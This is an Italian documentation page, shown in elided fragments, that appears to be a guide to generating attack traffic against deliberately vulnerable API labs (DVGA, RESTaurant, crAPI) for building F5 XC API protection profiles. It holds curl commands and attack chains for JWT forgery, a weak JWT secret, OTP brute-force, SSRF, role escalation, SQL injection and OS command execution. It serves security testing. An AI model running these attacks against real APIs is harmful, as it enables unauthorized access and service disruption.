...
description: >-
  ...
  generazione del traffico e lo sviluppo dei profili di protezione API F5 XC
sidebar:
  order: 8
i18n:
...
| `systemDiagnostics(cmd)` | Query | admin/password | Esegui comandi OS autorizzati |
...
**Duplicazione dei campi (ripetere il campo 500+ volte):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**SSRF tramite importPaste (sondare servizi interni):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**Falsificazione del token JWT (accetta token non firmati):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
| `/restaurant/menu` | GET | Sì | Qualsiasi | Elenco voci del menu |
...
**Accedere agli ordini di altri utenti (enumerazione offset):**
```bash
...
#### API2:2023 — Autenticazione non funzionante

**Brute-force del segreto debole JWT (il segreto è a 6 cifre: 97952):**
```bash
# Decodifica e falsifica i token su jwt.io
...
**Eliminare una voce del menu come Customer (dovrebbe richiedere Employee+):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**Cambiare il ruolo di un altro utente:**
```bash
...
**Sondare endpoint interni tramite image_url del menu (richiede ruolo Employee):**
```bash
...
# 4. Re-autenticazione per ottenere token di livello Chef
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
...
**Auth:** Token JWT Bearer (RS256, vulnerabile a confusione di algoritmo)
...
# Navigare su ${CRAPI}/mailhog/ o usare l'API di MailHog:
...
# 3. Login e ottenimento del token JWT
...
| `/identity/api/auth/login` | POST | No | Token JWT (confusione di algoritmo) |
...
```bash
# Ottieni prima il tuo UUID del veicolo
...
#### Sfida 3 — Autenticazione non funzionante: Brute-force dell'OTP per il reset password
...
#### Sfida 4 — Esposizione dati: Estrazione email dei meccanici
...
#### Sfida 13 — SQL Injection: Riscatto coupon multiplo
...
| **API2: Autenticazione non funzionante** | Falsificazione JWT (query `me`) | Segreto JWT debole (97952) | Brute-force OTP (v2), confusione algoritmo JWT |
| **API3: BOPLA** | — | `PATCH /profile` (escalation del ruolo) | Video conversion_params, esposizione email meccanici |
| **API4: Consumo risorse** | DoS tramite batch, ricorsione, alias, duplicazione campi | Enumerazione utenti tramite lunghezza risposta | DoS `contact_mechanic` repeat_request |
| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` come utente normale |
| **API6: Mass Assignment** | — | `PUT /orders` (status, quantity) | Status/quantità ordini, video conversion_params |
| **API7: SSRF** | Mutation `importPaste` | `PUT /menu` image_url | URL `contact_mechanic` mechanic_api |
...
| **API9: Gestione asset impropria** | — | — | `/auth/v2/check-otp` deprecato (nessun rate limit) |
...
### Fase 1: Baseline (percorso standard)
...
**Test bypass autenticazione:** Falsificare token JWT, brute-force degli OTP, utilizzare versioni API deprecate, confusione di algoritmo.
...
1. **Catena di escalation RESTaurant:** Registrazione → Token → PATCH ruolo a Chef → Re-auth → Command injection
2. **Flusso completo crAPI:** Registrazione → Verifica email (MailHog) → Login → Aggiungi veicolo → Contatta meccanico (SSRF) → Manipolazione ordini
3. **DVGA da ricognizione a exploit:** Introspezione → Scoperta systemDiagnostics → Brute-force credenziali admin → Esecuzione comandi OS
